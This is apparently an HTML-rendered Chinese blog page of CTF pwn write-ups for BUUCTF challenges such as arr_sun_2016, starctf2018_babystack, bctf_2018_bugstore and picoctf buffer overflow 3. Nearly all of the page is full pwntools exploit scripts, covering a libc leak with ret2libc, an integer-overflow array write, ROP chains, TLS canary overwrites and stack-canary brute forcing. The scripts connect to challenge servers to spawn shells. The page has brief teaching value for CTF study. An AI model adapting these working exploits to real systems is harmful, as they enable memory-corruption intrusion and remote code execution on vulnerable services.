class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#  -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./main&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;2.27&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#b *$rebase(0xF56) malloc调试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x1205) flag测试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x148B) free</span></span><br><span class="line"><span class="comment"># gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x1199)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># db=gdb.debug(&quot;./server&quot;,gdbscript=gdbscript)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;39.105.108.53&quot;</span></span><br><span class="line">    remote_port =<span class="number">28784</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="comment">#b *0x400E83 MALLOCz</span></span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0x145F)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x44C8)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># def debug_force():</span></span><br><span class="line"><span class="comment">#     global io</span></span><br><span class="line"><span class="comment">#     io.close()</span></span><br><span class="line"><span class="comment">#     gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x145F)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     io=gdb.debug(elf_path,gdbscript=gdbscript)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x70</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;Please enter your data:\n&quot;</span>,data)</span><br><span class="line">    sa(<span class="string">b&quot;ength of your data:\n&quot;</span>,size)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index</span>):</span><br><span class="line">    sl(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;number of your data:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Your choice : &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;game&#x27;s index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># def show(index):</span></span><br><span class="line"><span class="comment">#     sla(b&quot;&gt;&gt; &quot;, b&quot;3&quot;)</span></span><br><span class="line"><span class="comment">#     sla(b&quot;index&gt; &quot;,str(index))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def edit(index,content):</span></span><br><span class="line"><span class="comment">#     sla(b&quot;&gt;&gt; &quot;, b&quot;3&quot;)</span></span><br><span class="line"><span class="comment">#     sla(b&quot;Index: &quot;,str(index))</span></span><br><span class="line"><span class="comment">#     sa(b&quot;Content: &quot;,content)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def convert_str_asmencode(content: str):</span></span><br><span class="line"><span class="comment">#     out = &quot;&quot;</span></span><br><span class="line"><span class="comment">#     for i in content:</span></span><br><span class="line"><span class="comment">#         out = hex(ord(i))[2:] + out</span></span><br><span class="line"><span class="comment">#     out = &quot;0x&quot; + out</span></span><br><span class="line"><span class="comment">#     return out</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;Type &#x27;3&#x27; to exit the program&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="string">b&quot;10&quot;</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x63</span>+<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;10\n&quot;</span>,<span class="string">b&quot;8&quot;</span>*<span class="number">9</span>+<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">echo(-<span class="number">3</span>)</span><br><span class="line">load_addr=u64(rld().ljust(<span class="number">8</span>,<span class="string">b&quot;\0&quot;</span>))+<span class="number">0x5568dd249000</span>-<span class="number">0x5568dd2496b8</span></span><br><span class="line">add(<span class="string">b&quot;10\n&quot;</span>,<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ru(<span class="string">b&quot;Your entry number 11 is to large\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="string">b&quot;10&quot;</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x63</span>+<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;1\n&quot;</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x40</span>+p32(<span class="number">0xfffffffe</span>)+<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">printf_addr=load_addr+elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;10\n  &quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">4</span>+p32(printf_addr&amp;<span class="number">0xffffffff</span>)+p16((printf_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)+<span class="string">b&quot;\n&quot;</span>)<span class="comment">#-1</span></span><br><span class="line">add(<span class="string">b&quot;1\n&quot;</span>,<span class="string">b&quot;aaaa\n&quot;</span>)<span class="comment">#0</span></span><br><span class="line">sl(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">ru(<span class="string">b&quot;will be helpful\n&quot;</span>)</span><br><span class="line">sl(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">libc_base=u64(rld().ljust(<span class="number">8</span>,<span class="string">b&quot;\0&quot;</span>))-<span class="number">0x7f20043426a0</span>+<span class="number">0x7f2004155000</span></span><br><span class="line">sla(<span class="string">b&quot;number of your data:\n&quot;</span>,<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    add(<span class="string">b&quot;10&quot;</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x63</span>+<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;1\n&quot;</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x40</span>+p32(<span class="number">0xfffffffe</span>)+<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">add(<span class="string">b&quot;10\n&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">4</span>+p32(system_addr&amp;<span class="number">0xffffffff</span>)+p16((system_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)+<span class="string">b&quot;\n&quot;</span>)<span class="comment">#-1</span></span><br><span class="line">add(<span class="string">b&quot;10\n&quot;</span>,<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">sl(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">it()</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rl())</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#add(b&quot;\n&quot;,b&quot;\n&quot;)</span></span><br><span class="line"><span class="comment">#add(b&quot;1\n&quot;,b&quot;\n&quot;)</span></span><br><span class="line"><span class="comment">#echo(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(b&quot;1000&quot;,b&quot;1&quot;*0x63+b&quot;1&quot;)</span></span><br><span class="line"><span class="comment">#add(10,b&quot;a&quot;*0x63)</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="arr-sun-2016"><a href="#arr-sun-2016" class="headerlink" title="arr_sun_2016"></a>arr_sun_2016</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#arr_sun_2016">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>表面上看上去无法向下溢出</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842873133-8273dd56-0672-424e-8d82-9b18a978c12d.png#averageHue=%23fefefe&clientId=u9d5fd636-f51f-4&from=paste&height=82&id=u0dfaf6f4&originHeight=102&originWidth=410&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11436&status=done&style=none&taskId=u23e92873-1628-4e79-aca2-3d868b0a2f2&title=&width=328" alt="image.png"></p>
<p>但是这里汇编实现是可以溢出的</p>
<p>比如说我们像输入v1&#x3D;0xd</p>
<p>输入0x8000000d就好，这个刚好也是负数</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842880187-a2a00964-1451-4d2d-9ea2-4e04508c150d.png#averageHue=%23f3f3ec&clientId=u9d5fd636-f51f-4&from=paste&height=30&id=u6d4b3aac&originHeight=38&originWidth=479&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8006&status=done&style=none&taskId=uc456cdaf-4385-4ac9-99c7-6d6988ab9ea&title=&width=383.2" alt="image.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">sa(b<span class="string">&quot;What should I call you? \n&quot;</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x8000000d</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(elf.plt[<span class="string">&quot;__isoc99_scanf&quot;</span>]))</span><br><span class="line"></span><br><span class="line">pop_2_ret=<span class="number">0x080487ba</span></span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x8000000e</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(pop_2_ret))</span><br><span class="line"></span><br><span class="line">fmt_s=<span class="number">0x804882F</span></span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x8000000f</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(fmt_s))</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x08049B30</span></span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x80000010</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(bss))</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x804857B</span></span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x80000011</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(backdoor))</span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x80000013</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(bss))</span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x80000013</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(bss))</span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x80000013</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(bss))</span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x80000013</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(bss))</span><br><span class="line">sla(b<span class="string">&quot;enter index\n&quot;</span>,str(<span class="number">0x80000013</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sla(b<span class="string">&quot;enter value\n&quot;</span>,str(bss))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="canary爆破"><a href="#canary爆破" class="headerlink" title="canary爆破"></a>canary爆破</h2><h3 id="starctf2018-babystack"><a href="#starctf2018-babystack" class="headerlink" title="starctf2018_babystack"></a>starctf2018_babystack</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#starctf2018_babystack">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>这个题目比较好，多线程里面canary会被放在栈上，所以可以通过栈溢出修改掉canary的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">send</span><span class="params">(payload)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;send?\n&quot;</span>, str(len(payload)).encode())</span></span><br><span class="line">    <span class="title function_">s</span><span class="params">(payload)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">lenss = <span class="number">0x1800</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29614</span>)</span><br><span class="line">    canary = <span class="number">12333222</span></span><br><span class="line">    payload = b<span class="string">&quot;a&quot;</span> * <span class="number">0x1008</span> + p64(canary) + b<span class="string">&quot;b&quot;</span> * <span class="number">8</span> + p64(<span class="number">0x4009E7</span>)</span><br><span class="line">    payload = payload.ljust(lenss, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    payload += p64(canary)</span><br><span class="line">    send(payload)</span><br><span class="line">    rl()</span><br><span class="line">    <span class="keyword">if</span> b<span class="string">&quot;stack smashing detected&quot;</span> in rl():</span><br><span class="line">        io.close()</span><br><span class="line">        lenss += <span class="number">8</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29614</span>)</span><br><span class="line">canary = <span class="number">12333222</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400C03</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400C01</span></span><br><span class="line">leave_ret = <span class="number">0x400955</span></span><br><span class="line">bss_start_addr = <span class="number">0x602300</span></span><br><span class="line">payload = (</span><br><span class="line">    b<span class="string">&quot;a&quot;</span> * <span class="number">0x1008</span></span><br><span class="line">    + p64(canary)</span><br><span class="line">    + p64(bss_start_addr - <span class="number">8</span>)</span><br><span class="line">    + p64(pop_rdi_ret)</span><br><span class="line">    + p64(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    + p64(elf.plt[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    + p64(pop_rdi_ret)</span><br><span class="line">    + p64(<span class="number">0</span>)</span><br><span class="line">    + p64(pop_rsi_r15_ret)</span><br><span class="line">    + p64(bss_start_addr)</span><br><span class="line">    + p64(<span class="number">0</span>)</span><br><span class="line">    + p64(elf.plt[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    + p64(leave_ret)</span><br><span class="line">)</span><br><span class="line">payload = payload.ljust(lenss, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">send(payload)</span><br><span class="line">ru(b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">s(</span><br><span class="line">    p64(pop_rdi_ret)</span><br><span class="line">    + p64(libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>)))</span><br><span class="line">    + p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(b<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="bctf-2018-bugstore"><a href="#bctf-2018-bugstore" class="headerlink" title="bctf_2018_bugstore"></a>bctf_2018_bugstore</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#bctf_2018_bugstore">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>新的利用思路，当知道了libc地址后可以通过爆破修改lts的canary的值</p>
<p>距离libc0x6xx528处，爆破0x100即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0xFF</span> + <span class="number">1</span>)</span>:</span><br><span class="line">    <span class="meta"># io = process(elf_path)</span></span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26652</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;F&quot;</span>)</span><br><span class="line">    s(b<span class="string">&quot;%p%p%p%p%p%p%p%p%plibc:%p&quot;</span>)</span><br><span class="line">    ru(b<span class="string">&quot;libc:&quot;</span>)</span><br><span class="line">    libc_base = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">231</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">    offset = <span class="number">0x600528</span></span><br><span class="line">    offset += i &lt;&lt; <span class="number">12</span></span><br><span class="line">    sla(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    tls_canary_addr = libc_base + offset</span><br><span class="line">    sl(str(tls_canary_addr))</span><br><span class="line">    try:</span><br><span class="line">        sla(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;S&quot;</span>)</span><br><span class="line">        one_gadget_addr = one_gadget[<span class="number">1</span>] + libc_base</span><br><span class="line">        sl(b<span class="string">&quot;a&quot;</span> * <span class="number">0x28</span> + p64(<span class="number">0x45524F5453475542</span>) + b<span class="string">&quot;a&quot;</span> * <span class="number">8</span> + p64(one_gadget_addr))</span><br><span class="line">        it()</span><br><span class="line">    except:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure>

<h3 id="picoctf-2018-buffer-overflow-3"><a href="#picoctf-2018-buffer-overflow-3" class="headerlink" title="picoctf_2018_buffer overflow 3"></a>picoctf_2018_buffer overflow 3</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#picoctf_2018_buffer%20overflow%203">BUUCTF在线评测</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shell = ssh(host=<span class="string">&quot;node4.buuoj.cn&quot;</span>, user=<span class="string">&quot;CTFMan&quot;</span>, port=<span class="number">26682</span>, password=<span class="string">&quot;guest&quot;</span>)</span><br><span class="line">def brute_force_canary(stack_len: <span class="type">int</span>):</span><br><span class="line">    canary = b<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j in range(<span class="number">255</span>):</span><br><span class="line">            payload = b<span class="string">&quot;a&quot;</span> * stack_len + canary + p8(j)</span><br><span class="line">            io = shell.process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">            io.sendlineafter(b<span class="string">&quot;Buffer?\n&quot;</span>, b<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">            io.sendafter(b<span class="string">&quot;Input&gt; &quot;</span>, payload)</span><br><span class="line">            <span class="keyword">if</span> b<span class="string">&quot;Stack Smashing Detected&quot;</span> in io.recvline():</span><br><span class="line">                io.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        canary += p8(j)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line">canary = brute_force_canary(<span class="number">32</span>)</span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span> * <span class="number">32</span> + canary + b<span class="string">&quot;b&quot;</span> * <span class="number">0x10</span> + p32(<span class="number">0x80486EB</span>)</span><br><span class="line">io = shell.process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">io.sendlineafter(b<span class="string">&quot;Buffer?\n&quot;</span>, b<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">io.sendafter(b<span class="string">&quot;Input&gt; &quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>学到了怎么利用ssh远程执行 牛逼</p>
